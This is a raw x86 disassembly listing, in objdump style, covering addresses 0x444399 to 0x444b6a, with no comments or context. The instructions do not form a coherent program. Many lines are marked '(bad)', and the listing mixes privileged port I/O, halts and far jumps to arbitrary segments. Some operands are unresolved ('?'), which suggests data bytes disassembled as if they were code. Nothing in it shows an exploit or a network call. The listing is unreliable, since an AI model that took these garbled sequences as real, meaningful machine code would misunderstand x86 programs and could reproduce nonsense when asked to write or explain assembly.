  444399:	(bad)  
  44439a:	in     eax,dx
  44439b:	adc    eax,0x45a25217
  4443a0:	inc    ebx
  4443a1:	dec    esi
  4443a2:	mov    ecx,0xb0851520
  4443a7:	(bad)  
  4443a8:	fmul   DWORD PTR [edi-0x50bad5db]
  4443ae:	aas    
  4443af:	repnz pop esi
  4443b1:	pop    edx
  4443b2:	cwde   
  4443b3:	fwait
  4443b4:	push   eax
  4443b5:	imul   edi,DWORD PTR [esi+edi*8],0x1fd135e9
  4443bc:	movups xmm1,XMMWORD PTR [edx-0x28d66a19]
  4443c3:	out    0x3b,al
  4443c5:	add    BYTE PTR [edx+0x73],ch
  4443c8:	push   ds
  4443c9:	test   eax,0xeddee820
  4443ce:	xor    bl,BYTE PTR [edi-0x2d1458bd]
  4443d4:	add    ecx,esi
  4443d6:	js     0x44437d
  4443d8:	dec    ecx
  4443d9:	sub    bl,dl
  4443db:	push   0x29
  4443dd:	lock mov cl,0x94
  4443e0:	fidivr WORD PTR [ebp+ecx*2-0x45b5361]
  4443e7:	repz xchg edi,eax
  4443e9:	or     DWORD PTR [edi],edi
  4443eb:	ror    BYTE PTR [edx-0x5f],cl
  4443ee:	ror    BYTE PTR [ebx-0x21],cl
  4443f1:	mov    al,ds:0x6e7364c6
  4443f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4443f7:	mov    bh,0xa
  4443f9:	es pop es
  4443fb:	xchg   ebx,eax
  4443fc:	pusha  
  4443fd:	addr16 iret 
  4443ff:	xor    eax,0x7c42d91a
  444404:	loop   0x4443be
  444406:	dec    ecx
  444407:	sbb    eax,0x19fea924
  44440c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44440d:	aad    0x11
  44440f:	sbb    ebx,esp
  444411:	call   0xa42c:0x9c7d0bbb
  444418:	sahf   
  444419:	fisttp DWORD PTR [edi+0xb]
  44441c:	mov    ds:0x16c4b405,al
  444421:	nop
  444422:	sbb    cl,BYTE PTR [edi-0x1345e56b]
  444428:	ins    BYTE PTR es:[edi],dx
  444429:	and    eax,0xfa00c9b9
  44442e:	rcl    BYTE PTR [esi-0x1ed05d55],0x6d
  444435:	push   0x7
  444437:	gs (bad) 
  444439:	hlt    
  44443a:	aad    0x36
  44443c:	pop    ecx
  44443d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44443e:	jae    0x444456
  444440:	jns    0x444497
  444442:	push   edi
  444443:	mov    BYTE PTR [eax-0xc2b48cf],bl
  444449:	(bad)  
  44444a:	outs   dx,BYTE PTR ds:[esi]
  44444b:	scas   eax,DWORD PTR es:[edi]
  44444c:	sub    DWORD PTR [esi],ebx
  44444e:	xchg   ebx,eax
  44444f:	retf   
  444450:	ins    BYTE PTR es:[edi],dx
  444451:	sar    DWORD PTR [edi-0x43563aec],cl
  444457:	jne    0x4444a7
  444459:	in     al,0xbd
  44445b:	push   esp
  44445c:	sar    DWORD PTR [eax],0x82
  44445f:	shl    BYTE PTR [ebp-0x2b],cl
  444462:	mov    esp,?
  444464:	fst    QWORD PTR [edx-0x76e79e0f]
  44446a:	pop    ecx
  44446b:	stc    
  44446c:	adc    esi,DWORD PTR [esi]
  44446e:	xchg   BYTE PTR [eax-0x12],ch
  444471:	les    ebp,FWORD PTR [ebx-0x3d]
  444474:	inc    esp
  444475:	or     DWORD PTR [esi],ebp
  444477:	push   ss
  444478:	pop    ds
  444479:	inc    ebp
  44447a:	test   eax,0x6cc91b7d
  44447f:	js     0x444494
  444481:	lods   eax,DWORD PTR ds:[esi]
  444482:	cmp    BYTE PTR [ecx-0x52],0x99
  444486:	jmp    0x44445b
  444488:	xchg   ebx,eax
  444489:	bound  esi,QWORD PTR [ebx-0x79]
  44448c:	sbb    cl,BYTE PTR [ebx-0x39]
  44448f:	push   ecx
  444490:	sbb    DWORD PTR [edx],eax
  444492:	mov    ah,0x4
  444494:	and    al,0x87
  444496:	xor    eax,0xd90595df
  44449b:	in     al,0x22
  44449d:	nop
  44449e:	xchg   ecx,eax
  44449f:	fs clc 
  4444a1:	sub    bh,bh
  4444a3:	jns    0x4444d8
  4444a5:	repnz mov esi,0xf2b133d4
  4444ab:	out    0x65,al
  4444ad:	add    ebx,ecx
  4444af:	in     eax,0x68
  4444b1:	lods   eax,DWORD PTR ds:[esi]
  4444b2:	mov    al,ds:0x372756e0
  4444b7:	arpl   WORD PTR [ebx+0x4a74b61a],di
  4444bd:	and    BYTE PTR [ebp-0xf],dl
  4444c0:	adc    eax,0x7ee8a05
  4444c5:	jo     0x444451
  4444c7:	sub    eax,0xf2a23916
  4444cc:	idiv   BYTE PTR [ebp+0xf479f19]
  4444d2:	cmp    al,0x80
  4444d4:	or     al,0xb6
  4444d6:	xor    edx,DWORD PTR [ebx+ebx*4+0x3d]
  4444da:	nop
  4444db:	icebp  
  4444dc:	dec    DWORD PTR [ecx-0x36]
  4444df:	pusha  
  4444e0:	or     DWORD PTR [esi-0x62d3e1b1],ebx
  4444e6:	cdq    
  4444e7:	bound  edx,QWORD PTR [esi-0x2fa27731]
  4444ed:	mov    eax,ds:0xcc459f0f
  4444f2:	inc    eax
  4444f3:	js     0x4444c7
  4444f5:	in     al,dx
  4444f6:	mov    edi,0xfcddeb44
  4444fb:	push   ecx
  4444fc:	gs loope 0x44452c
  4444ff:	repz add DWORD PTR [ebx-0x6e75555],edi
  444506:	loop   0x4444ed
  444508:	push   ds
  444509:	dec    ebx
  44450a:	or     eax,0x8ba7e798
  44450f:	in     al,0xc5
  444511:	inc    ebx
  444512:	out    dx,eax
  444513:	pusha  
  444514:	outs   dx,BYTE PTR ds:[esi]
  444515:	xchg   esi,eax
  444516:	loope  0x4444fb
  444518:	xor    ebx,DWORD PTR [esi]
  44451a:	mov    ecx,0x57934e44
  44451f:	pop    ebp
  444520:	pop    es
  444521:	(bad)
  444525:	xor    al,0x68
  444527:	call   DWORD PTR [ecx+0x22cfc9a7]
  44452d:	sbb    DWORD PTR [ebx+0x1a],edi
  444530:	mov    ecx,0x34242888
  444535:	mov    eax,ds:0xe7bf27fb
  44453a:	adc    DWORD PTR [edx],eax
  44453c:	cmc    
  44453d:	lods   al,BYTE PTR ds:[esi]
  44453e:	sub    al,cl
  444540:	fwait
  444541:	ror    edi,0x14
  444544:	pop    ds
  444545:	push   es
  444546:	mov    eax,ds:0x969e7510
  44454b:	jmp    0x444539
  44454d:	or     eax,0x5a0bfdfc
  444552:	pop    ebp
  444553:	pushf  
  444554:	xchg   DWORD PTR [ebp+0x2a],edi
  444557:	loopne 0x444528
  444559:	je     0x444521
  44455b:	out    dx,al
  44455c:	scas   al,BYTE PTR es:[edi]
  44455d:	lahf   
  44455e:	stos   DWORD PTR es:[edi],eax
  44455f:	or     esi,esp
  444561:	dec    esi
  444562:	jns    0x444503
  444564:	cld    
  444565:	iret   
  444566:	cmp    di,si
  444569:	or     BYTE PTR [ebp+0x332c06e4],dh
  44456f:	sbb    esp,DWORD PTR [ebp-0x3719aae5]
  444575:	dec    esi
  444576:	adc    dl,BYTE PTR [eax+edx*2+0x4a]
  44457a:	(bad)  
  44457b:	rcl    DWORD PTR [edi],cl
  44457d:	fldenv [ecx-0x5a]
  444580:	stos   BYTE PTR es:[edi],al
  444581:	lea    edx,[edx+0x18]
  444584:	sbb    BYTE PTR [ebx+0x72e1f1eb],0x1e
  44458b:	add    eax,0x872f1fb2
  444590:	jnp    0x444519
  444592:	mov    ebp,0xbb12024
  444597:	inc    edx
  444598:	cli    
  444599:	test   eax,0xb8c5f349
  44459e:	xor    al,0xe7
  4445a0:	cmp    DWORD PTR [esi-0x56e8a160],ecx
  4445a6:	fiadd  WORD PTR [edx+0x73]
  4445a9:	jno    0x44454f
  4445ab:	xor    al,0x3e
  4445ad:	popf   
  4445ae:	dec    ebx
  4445af:	mov    WORD PTR [ecx-0x49],?
  4445b2:	cmp    bh,BYTE PTR [edi-0x4a60929c]
  4445b8:	xor    ebx,DWORD PTR [ecx-0x32e77cc8]
  4445be:	jp     0x4445ec
  4445c0:	pop    ss
  4445c1:	or     bl,0x6f
  4445c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4445c5:	xor    eax,0xefdde6c3
  4445ca:	and    bh,cl
  4445cc:	retf   
  4445cd:	pushf  
  4445ce:	sub    DWORD PTR [eax],0x55
  4445d1:	int    0x60
  4445d3:	jmp    0x1a883f90
  4445d8:	jne    0x444602
  4445da:	mov    eax,0xcf96c9e8
  4445df:	iret   
  4445e0:	ficom  DWORD PTR [edi+0x482e4e09]
  4445e6:	gs push ebp
  4445e8:	dec    esi
  4445e9:	ss push esi
  4445eb:	and    BYTE PTR [eax-0x5a135f25],ah
  4445f1:	pop    edi
  4445f2:	shr    esi,0x76
  4445f5:	xchg   ebx,eax
  4445f6:	mov    ch,0x6b
  4445f8:	sub    bh,BYTE PTR [ecx-0x43afca91]
  4445fe:	fwait
  4445ff:	ins    DWORD PTR es:[edi],dx
  444600:	pop    edi
  444601:	push   es
  444602:	outs   dx,DWORD PTR ds:[esi]
  444603:	mov    eax,ds:0xf3c0e565
  444608:	shl    DWORD PTR [ecx],cl
  44460a:	inc    eax
  44460b:	mov    WORD PTR [ebx],fs
  44460d:	sub    DWORD PTR [edx],ecx
  44460f:	inc    ebx
  444610:	dec    esi
  444611:	adc    esp,DWORD PTR [esi]
  444613:	jns    0x444655
  444615:	and    edx,ebx
  444617:	mov    al,bh
  444619:	sbb    al,BYTE PTR [edx-0x36]
  44461c:	sbb    eax,0xdbeb094a
  444621:	sar    BYTE PTR [ecx-0x4d5dc09d],1
  444627:	aaa    
  444628:	jnp    0x44468c
  44462a:	iret   
  44462b:	xchg   ecx,eax
  44462c:	sbb    ecx,esi
  44462e:	xchg   ebp,eax
  44462f:	sbb    eax,DWORD PTR [esi+0x2]
  444632:	jle    0x4445d6
  444634:	and    DWORD PTR [ecx-0x2f],ebx
  444637:	jns    0x444635
  444639:	jne    0x44469b
  44463b:	add    esi,ecx
  44463d:	mov    edx,0xc7fd890b
  444642:	jp     0x444620
  444644:	sbb    al,0xfd
  444646:	sar    cl,0x17
  444649:	fnstcw WORD PTR [ebp+esi*1-0x742958aa]
  444650:	ret    0x8b6f
  444653:	aam    0x43
  444655:	stos   BYTE PTR es:[edi],al
  444656:	sti    
  444657:	jb     0x44469f
  444659:	call   FWORD PTR [ebx+0x66]
  44465c:	pop    ds
  44465d:	in     eax,0xa8
  44465f:	gs and ch,cl
  444662:	jp     0x444671
  444664:	pop    ebx
  444665:	fisub  WORD PTR [ecx-0x345faf77]
  44466b:	sub    BYTE PTR [edx-0x4cec55dc],cl
  444671:	loopne 0x4446ae
  444673:	retf   0xa4c5
  444676:	xchg   ebx,eax
  444677:	mov    BYTE PTR [eax-0x1961f89e],ah
  44467d:	jle    0x4446ae
  44467f:	fdivr  DWORD PTR [ecx]
  444681:	imul   esi,DWORD PTR ds:0xe2a4367b,0xdd8f1726
  44468b:	mov    eax,0x59d62923
  444690:	dec    eax
  444691:	std    
  444692:	xchg   edi,eax
  444693:	in     al,0xc8
  444695:	sar    BYTE PTR [ebx],cl
  444697:	push   ebp
  444698:	out    dx,eax
  444699:	sbb    al,0xc0
  44469b:	pop    esp
  44469c:	pop    ss
  44469d:	add    al,0x64
  44469f:	dec    ebp
  4446a0:	pop    ds
  4446a1:	push   edx
  4446a2:	jmp    0xf114:0xcf62e8d3
  4446a9:	fwait
  4446aa:	jge    0x44465e
  4446ac:	xchg   esp,eax
  4446ad:	mov    ds:0xde1271fb,al
  4446b2:	sbb    esp,DWORD PTR [edx+eax*8-0x77bd979e]
  4446b9:	add    BYTE PTR [ebp+0x46],dh
  4446bc:	ja     0x444687
  4446be:	mov    eax,ds:0x132919c8
  4446c3:	jb     0x4446ac
  4446c5:	leave  
  4446c6:	xchg   ebp,eax
  4446c7:	fild   DWORD PTR [ebp+0x62]
  4446ca:	in     eax,0xec
  4446cc:	and    al,0xd3
  4446ce:	and    bh,BYTE PTR [eax+0x52c8f954]
  4446d4:	les    edx,FWORD PTR [ebp-0xc3d3a28]
  4446da:	dec    edx
  4446db:	jno    0x444672
  4446dd:	fdivr  st(5),st
  4446df:	jmp    0x4446d1
  4446e1:	sub    al,0x80
  4446e3:	adc    ebx,DWORD PTR [eax]
  4446e5:	(bad)  [ecx]
  4446e7:	out    dx,al
  4446e8:	in     al,0xa5
  4446ea:	push   edi
  4446eb:	jmp    0x618fe019
  4446f0:	stc    
  4446f1:	pop    esp
  4446f2:	xor    BYTE PTR [esi-0x4],al
  4446f5:	mov    bh,bl
  4446f7:	cdq    
  4446f8:	dec    edx
  4446f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4446fa:	and    eax,0xc0be0725
  4446ff:	dec    ebp
  444700:	xlat   BYTE PTR ds:[ebx]
  444701:	cdq    
  444702:	sti    
  444703:	in     eax,0x39
  444705:	or     al,0xad
  444707:	xor    ebx,ecx
  444709:	les    esi,FWORD PTR [edx]
  44470b:	lods   eax,DWORD PTR ds:[esi]
  44470c:	jne    0x44472b
  44470e:	(bad)  
  44470f:	hlt    
  444710:	xor    BYTE PTR [esi],cl
  444712:	fidivr DWORD PTR [eax]
  444714:	and    BYTE PTR [ecx],bh
  444716:	push   eax
  444717:	ror    al,1
  444719:	(bad)  
  44471a:	cs sbb eax,0x3b035c6d
  444720:	or     bh,BYTE PTR gs:0x5c2734e7
  444727:	out    dx,al
  444728:	fimul  DWORD PTR [eax+edi*1+0x14692d36]
  44472f:	sub    DWORD PTR [ecx],edi
  444731:	pop    ebp
  444732:	cmp    DWORD PTR [ebx-0x18f0fa6a],edx
  444738:	aad    0x43
  44473a:	mov    dl,0xe9
  44473c:	test   DWORD PTR [ebp-0x76dce96f],ebx
  444742:	das    
  444743:	mov    cs,ecx
  444745:	mov    cl,0x73
  444747:	in     eax,dx
  444748:	arpl   WORD PTR [ebx+ebx*2-0x109a9ac6],bp
  44474f:	div    BYTE PTR [esi]
  444751:	push   ecx
  444752:	leave  
  444753:	leave  
  444754:	cdq    
  444755:	fsub   DWORD PTR [eax-0x5d]
  444758:	sbb    bl,BYTE PTR [ecx]
  44475a:	mov    ds:0xba502bc7,al
  44475f:	imul   eax,DWORD PTR ds:0x47e00b9b,0x1ce44fd2
  444769:	xlat   BYTE PTR ds:[ebx]
  44476a:	lods   al,BYTE PTR es:[esi]
  44476c:	adc    BYTE PTR [ecx-0x40],0x54
  444770:	cli    
  444771:	fild   DWORD PTR [eax-0x1]
  444774:	mov    ch,0x81
  444776:	enter  0xab98,0xa6
  44477a:	mov    ebx,0x3c65b16b
  44477f:	into   
  444780:	test   al,0x0
  444782:	cmp    eax,0xbb8c7135
  444787:	in     al,0x1e
  444789:	add    al,0x75
  44478b:	jecxz  0x444732
  44478d:	dec    edx
  44478e:	mov    esp,esi
  444790:	sub    al,BYTE PTR [edx+0x15]
  444793:	cmp    al,0xd2
  444795:	sub    al,0x90
  444797:	fsubr  QWORD PTR [edi]
  444799:	jns    0x444763
  44479b:	(bad)  
  44479c:	pop    edi
  44479d:	push   ecx
  44479e:	mov    ah,0x70
  4447a0:	dec    ebp
  4447a1:	outs   dx,BYTE PTR ds:[esi]
  4447a2:	mov    edi,0x756917af
  4447a7:	ins    DWORD PTR es:[edi],dx
  4447a8:	jae    0x444814
  4447aa:	leave  
  4447ab:	jno    0x4447c5
  4447ad:	stc    
  4447ae:	in     al,dx
  4447af:	push   edi
  4447b0:	or     BYTE PTR [ebx],0x8
  4447b3:	into   
  4447b4:	adc    ebx,DWORD PTR [ebp+0x27d9ddab]
  4447ba:	pop    ss
  4447bb:	inc    eax
  4447bc:	cmp    eax,0x140064ab
  4447c1:	repz mov ebx,0x50f23cf4
  4447c7:	mov    dh,0x65
  4447c9:	inc    ecx
  4447ca:	repz jmp 0x4447ce
  4447cd:	out    dx,eax
  4447ce:	push   esp
  4447cf:	add    BYTE PTR [edx],bl
  4447d1:	stc    
  4447d2:	xor    al,0x1a
  4447d4:	adc    BYTE PTR [ecx-0x646a160d],0x2b
  4447db:	sbb    al,0xa
  4447dd:	bswap  edx
  4447df:	dec    eax
  4447e0:	lods   al,BYTE PTR ds:[esi]
  4447e1:	neg    BYTE PTR es:[esi-0x8]
  4447e5:	cs mov ch,0x84
  4447e8:	or     eax,0x4538f6e8
  4447ed:	lods   eax,DWORD PTR ds:[esi]
  4447ee:	adc    ebp,esi
  4447f0:	mul    esp
  4447f2:	mov    dl,0x51
  4447f4:	ja     0x44480d
  4447f6:	ins    DWORD PTR es:[edi],dx
  4447f7:	imul   esp,DWORD PTR [eax+0x11],0x6f5a64ba
  4447fe:	aam    0xfb
  444800:	add    eax,0x7cee9c73
  444805:	leave  
  444806:	sbb    esp,esp
  444808:	mov    ah,0xfc
  44480a:	mov    edi,ecx
  44480c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44480d:	cli    
  44480e:	jne    0x444800
  444810:	arpl   WORD PTR [esi+0x24a53c8d],sp
  444816:	mov    ebp,0x55adeae8
  44481b:	dec    esp
  44481c:	sbb    BYTE PTR [ecx],bl
  44481e:	pop    ebx
  44481f:	(bad)  
  444820:	cmp    DWORD PTR [edi-0x48304812],ebx
  444826:	stos   DWORD PTR es:[edi],eax
  444827:	sbb    DWORD PTR [edi-0x63057d77],esi
  44482d:	bound  edi,QWORD PTR [ecx-0x7b]
  444830:	push   ds
  444831:	sbb    edx,esp
  444833:	pop    edi
  444834:	adc    edi,DWORD PTR [edi-0x5c84110d]
  44483a:	dec    ebx
  44483b:	sbb    DWORD PTR [eax],ebp
  44483d:	rcr    ebx,0xd3
  444840:	dec    edx
  444841:	xchg   BYTE PTR [eax+edx*1],dl
  444844:	mov    cl,0x3e
  444846:	out    0x84,al
  444848:	es es jmp 0x4447ee
  44484c:	fs pushf 
  44484e:	jnp    0x444843
  444850:	push   ss
  444851:	push   eax
  444852:	pop    esi
  444853:	(bad)  
  444854:	fistp  WORD PTR [edi+0x393e9b46]
  44485a:	mov    ch,0x54
  44485c:	or     al,0xa2
  44485e:	test   eax,0xb776a5e0
  444863:	jmp    0xd8a3:0xb89eb059
  44486a:	out    0x37,eax
  44486c:	pop    edi
  44486d:	das    
  44486e:	mov    esi,0xf81224b4
  444873:	outs   dx,DWORD PTR ds:[esi]
  444874:	(bad)  
  444875:	rcr    DWORD PTR [ebx],cl
  444877:	cwde   
  444878:	dec    ecx
  444879:	cli    
  44487a:	cwde   
  44487b:	aam    0x55
  44487d:	adc    DWORD PTR ds:0xb7ae56c1,edx
  444883:	adc    BYTE PTR [eax],cl
  444885:	lods   al,BYTE PTR ds:[esi]
  444886:	mov    ebp,0x3f697b4
  44488b:	bound  esi,QWORD PTR [ebp-0x1c]
  44488e:	out    dx,eax
  44488f:	lock or ebp,esp
  444892:	push   edx
  444893:	stos   BYTE PTR es:[edi],al
  444894:	lea    ebp,[ecx-0x7c]
  444897:	mov    ah,0xc1
  444899:	mov    eax,0xba87056e
  44489e:	mov    eax,0x4bd735bd
  4448a3:	in     al,dx
  4448a4:	sub    bl,BYTE PTR [ebx+0x783db042]
  4448aa:	dec    ecx
  4448ab:	ret    0x2dc
  4448ae:	fwait
  4448af:	inc    ebp
  4448b0:	stos   DWORD PTR es:[edi],eax
  4448b1:	lods   al,BYTE PTR ds:[esi]
  4448b2:	popa   
  4448b3:	bnd jl 0x44488f
  4448b6:	lea    eax,[edx+eax*1-0x65]
  4448ba:	fcomi  st,st(7)
  4448bc:	xor    bh,BYTE PTR [ecx-0x466ebb28]
  4448c2:	mov    ds:0x97a2b524,al
  4448c7:	shr    DWORD PTR [eax+0x4f],cl
  4448ca:	mov    dh,0x7c
  4448cc:	and    eax,0xe2f1bf78
  4448d1:	lock jecxz 0x4448e1
  4448d4:	sbb    eax,0x21d58669
  4448d9:	jae    0x444896
  4448db:	dec    edx
  4448dc:	fsubr  DWORD PTR [eax-0x52cd86d5]
  4448e2:	inc    ecx
  4448e3:	leave  
  4448e4:	push   es
  4448e5:	test   al,0x1a
  4448e7:	mov    ah,0x58
  4448e9:	and    DWORD PTR [edi-0x45a93dfc],esi
  4448ef:	(bad)  
  4448f0:	push   esi
  4448f1:	jmp    0x997eac1b
  4448f6:	mov    ebp,ebx
  4448f8:	cwde   
  4448f9:	jnp    0x4448a2
  4448fb:	cmp    al,0x7
  4448fd:	pop    edx
  4448fe:	push   0x2b7ad25c
  444903:	(bad)  
  444906:	mov    edi,0x9f7c5b24
  44490b:	add    ah,BYTE PTR [ecx+edx*4]
  44490e:	ret    0x407c
  444911:	pushf  
  444912:	ins    BYTE PTR es:[edi],dx
  444913:	pushf  
  444914:	or     edi,DWORD PTR [ebp+0x4a]
  444917:	das    
  444918:	push   cs
  444919:	bound  ebx,QWORD PTR [edi]
  44491b:	or     eax,0xb3f1a675
  444920:	dec    edi
  444921:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  444922:	mov    ebx,0x6ab7ab85
  444927:	hlt    
  444928:	push   eax
  444929:	adc    ah,BYTE PTR [ecx]
  44492b:	out    dx,al
  44492c:	mov    dh,0x6e
  44492e:	mov    esp,0x922912f4
  444933:	jmp    0x7c8fee65
  444938:	pop    edx
  444939:	mov    dl,0xa4
  44493b:	call   0xeb2d5058
  444940:	ins    BYTE PTR es:[edi],dx
  444941:	int    0x32
  444943:	dec    eax
  444944:	dec    edx
  444945:	fnstcw WORD PTR [ebx-0x94a1abc]
  44494b:	mov    esp,0x90cdf9a5
  444950:	jle    0x4448ee
  444952:	pop    ebx
  444953:	call   0x491d:0xd10a29e6
  44495a:	sub    DWORD PTR [ebp-0x9048323],0xffffffd9
  444961:	popf   
  444962:	shl    DWORD PTR [esi],1
  444964:	ss enter 0x3034,0x4a
  444969:	stc    
  44496a:	xchg   ebp,eax
  44496b:	push   0x2e0ab7ea
  444970:	bound  eax,QWORD PTR [esp+esi*1]
  444973:	outs   dx,BYTE PTR ds:[esi]
  444974:	(bad)
  444977:	in     al,dx
  444978:	cld    
  444979:	sbb    edx,DWORD PTR [edi+0x74]
  44497c:	sbb    DWORD PTR [ecx],edi
  44497e:	sar    DWORD PTR [esi],0x19
  444981:	mov    ah,0x6e
  444983:	jns    0x4449d9
  444985:	pop    ds
  444986:	adc    eax,0xd0d96656
  44498b:	xor    eax,0xf7179f7e
  444990:	int3   
  444991:	and    dl,bl
  444993:	jmp    DWORD PTR [esi]
  444995:	pushf  
  444996:	cmp    ecx,DWORD PTR [ecx+0x7466ddf1]
  44499c:	dec    ebp
  44499d:	push   0xffffff9f
  44499f:	pop    ss
  4449a0:	icebp  
  4449a1:	in     al,dx
  4449a2:	mov    eax,ds:0x7d36da38
  4449a7:	sub    bl,bl
  4449a9:	add    BYTE PTR [eax-0x4bd9048b],ch
  4449af:	inc    edx
  4449b0:	and    al,0x39
  4449b2:	ins    BYTE PTR es:[edi],dx
  4449b3:	cmp    eax,0x893e5ef1
  4449b8:	in     eax,0x9c
  4449ba:	stos   DWORD PTR es:[edi],eax
  4449bb:	ret    
  4449bc:	and    ebx,DWORD PTR [edx]
  4449be:	sar    DWORD PTR [ecx+0x6c],cl
  4449c1:	shl    DWORD PTR [ecx],1
  4449c3:	jecxz  0x4449ac
  4449c5:	adc    BYTE PTR [ebx],ah
  4449c7:	inc    ebp
  4449c8:	sbb    al,0x84
  4449ca:	into   
  4449cb:	out    dx,al
  4449cc:	(bad)  
  4449cd:	iret   
  4449ce:	sti    
  4449cf:	mov    edi,0x56c4c39e
  4449d4:	xchg   esi,eax
  4449d5:	repnz and edi,eax
  4449d8:	and    DWORD PTR [ecx],ebx
  4449da:	(bad)  
  4449dc:	int3   
  4449dd:	(bad)  
  4449de:	imul   DWORD PTR [ebx-0x51795e66]
  4449e4:	aad    0x8c
  4449e6:	pushf  
  4449e7:	jmp    0x4449cd
  4449e9:	arpl   WORD PTR [eax+0x5b],bp
  4449ec:	push   es
  4449ed:	sbb    eax,0x546d3bca
  4449f2:	cwde   
  4449f3:	in     eax,dx
  4449f4:	push   cs
  4449f5:	ja     0x444a03
  4449f7:	aas    
  4449f8:	xchg   bl,bh
  4449fa:	cmp    ebx,esi
  4449fc:	inc    eax
  4449fd:	mov    eax,ds:0x553c53b3
  444a02:	add    bh,BYTE PTR [edx-0x3]
  444a05:	push   eax
  444a06:	mov    edx,0xb96d0120
  444a0b:	xchg   esp,eax
  444a0c:	mov    dl,0xbe
  444a0e:	(bad)  
  444a0f:	jo     0x444995
  444a11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  444a12:	imul   eax,DWORD PTR [edi+0x780159ac],0x49
  444a19:	scas   eax,DWORD PTR es:[edi]
  444a1a:	jl     0x444a90
  444a1c:	cmp    bl,BYTE PTR [edx+0x201a24b0]
  444a22:	sti    
  444a23:	cmc    
  444a24:	cmc    
  444a25:	std    
  444a26:	mov    edi,esp
  444a28:	push   ss
  444a29:	fst    QWORD PTR [eax-0x1a12f92b]
  444a2f:	pop    ss
  444a30:	lods   eax,DWORD PTR ds:[esi]
  444a31:	shl    eax,cl
  444a33:	jmp    0xfb05:0xe6ef464c
  444a3a:	mov    ebp,ecx
  444a3c:	fsub   st,st(3)
  444a3e:	add    eax,0xe22987e1
  444a43:	cmp    al,0xe4
  444a45:	sbb    bl,ch
  444a47:	retf   
  444a48:	cmc    
  444a49:	aam    0xb4
  444a4b:	es push ebp
  444a4d:	pop    edx
  444a4e:	(bad)  
  444a4f:	out    dx,al
  444a50:	jmp    0x222831b0
  444a55:	sub    DWORD PTR [ebx+0x22],ebx
  444a58:	(bad)  
  444a59:	shr    ch,cl
  444a5b:	ins    BYTE PTR es:[edi],dx
  444a5c:	mov    dh,0x2d
  444a5e:	emms   
  444a60:	push   ss
  444a61:	xor    ebp,ebx
  444a63:	xchg   esi,eax
  444a64:	mov    edi,0x1a17b330
  444a69:	cdq    
  444a6a:	and    ebx,esp
  444a6c:	(bad)  
  444a6e:	rcr    BYTE PTR [edx+ecx*2-0x2dbdd464],0x85
  444a76:	sti    
  444a77:	jge    0x444a05
  444a79:	cld    
  444a7a:	cmp    DWORD PTR [edi+0x1a3b9a41],esp
  444a80:	dec    ecx
  444a81:	ret    
  444a82:	cs aad 0x77
  444a85:	xchg   ebx,eax
  444a86:	pushf  
  444a87:	cmp    bl,cl
  444a89:	loope  0x444a52
  444a8b:	cmp    al,0x49
  444a8d:	adc    eax,0x8925ceb1
  444a92:	inc    edx
  444a93:	jae    0x444a8c
  444a95:	push   edi
  444a96:	out    dx,al
  444a97:	(bad)  
  444a98:	std    
  444a99:	into   
  444a9a:	mov    ecx,0xb9a137bd
  444a9f:	mov    al,ds:0xfe7f9805
  444aa4:	pop    ecx
  444aa5:	arpl   dx,bx
  444aa7:	add    DWORD PTR [ebx],edx
  444aa9:	push   0xffffffa3
  444aab:	jmp    0xe4f5658c
  444ab0:	ror    ecx,1
  444ab2:	dec    ebp
  444ab3:	test   eax,0xf4213365
  444ab8:	and    eax,0x218e0fb3
  444abd:	mov    DWORD PTR [edx-0x67],edx
  444ac0:	inc    esp
  444ac1:	mov    ds:0x993c2b8a,eax
  444ac6:	stos   DWORD PTR es:[edi],eax
  444ac7:	(bad)  
  444ac8:	xor    eax,0xb623addb
  444acd:	add    ch,ah
  444acf:	pushf  
  444ad0:	dec    ebx
  444ad1:	daa    
  444ad2:	mov    ebp,0x48fa9524
  444ad7:	sub    BYTE PTR [ebp+0x1df17c0c],al
  444add:	imul   esi,DWORD PTR [edi],0x1b
  444ae0:	and    al,0x59
  444ae2:	in     eax,dx
  444ae3:	jmp    0xa330:0x497c3ebe
  444aea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  444aeb:	(bad)  
  444aed:	pop    ebx
  444aee:	gs out dx,eax
  444af0:	mov    cl,0xdd
  444af2:	mov    dh,0x57
  444af4:	pop    ds
  444af5:	cdq    
  444af6:	jl     0x444ad7
  444af8:	or     BYTE PTR [edi+0x47],bl
  444afb:	push   ebx
  444afc:	lahf   
  444afd:	sahf   
  444afe:	jmp    0x444b4f
  444b00:	fnstsw WORD PTR [esi-0x105282a6]
  444b06:	sub    bl,BYTE PTR [ecx-0x57]
  444b09:	sti    
  444b0a:	mov    bl,0x14
  444b0c:	mov    dl,0x98
  444b0e:	sbb    edi,DWORD PTR [edi]
  444b10:	jne    0x444b5b
  444b12:	mov    ch,0xf1
  444b14:	(bad)  
  444b15:	(bad)
  444b19:	jmp    0x9ca052a8
  444b1e:	and    esp,ecx
  444b20:	push   ebx
  444b21:	and    ebp,ebx
  444b23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  444b24:	sbb    BYTE PTR [esi-0x3a4151e5],ah
  444b2a:	loope  0x444b62
  444b2c:	aas    
  444b2d:	jae    0x444aca
  444b2f:	mov    dl,0x47
  444b31:	push   ss
  444b32:	and    BYTE PTR [esi+0x6d],al
  444b35:	push   DWORD PTR [edx-0x728b317c]
  444b3b:	(bad)  
  444b3c:	xchg   esp,eax
  444b3d:	lahf   
  444b3e:	cmp    esp,DWORD PTR [ebx+0x5d15a054]
  444b44:	xchg   edi,eax
  444b45:	addr16 sti 
  444b47:	int    0x10
  444b49:	test   eax,0xbeea4833
  444b4e:	xchg   esi,eax
  444b4f:	push   eax
  444b50:	ss sahf 
  444b52:	mov    esi,DWORD PTR [ebx+0x29]
  444b55:	icebp  
  444b56:	clc    
  444b57:	test   al,0x2d
  444b59:	xchg   esi,eax
  444b5a:	adc    al,0x30
  444b5c:	shl    ebp,cl
  444b5e:	and    DWORD PTR [ebp+0x1d],esi
  444b61:	adc    al,BYTE PTR [ecx+ebx*8+0x63]
  444b65:	lahf   
  444b66:	jnp    0x444b99
  444b68:	or     al,0xd8
  444b6a:	mov    bh,0x81
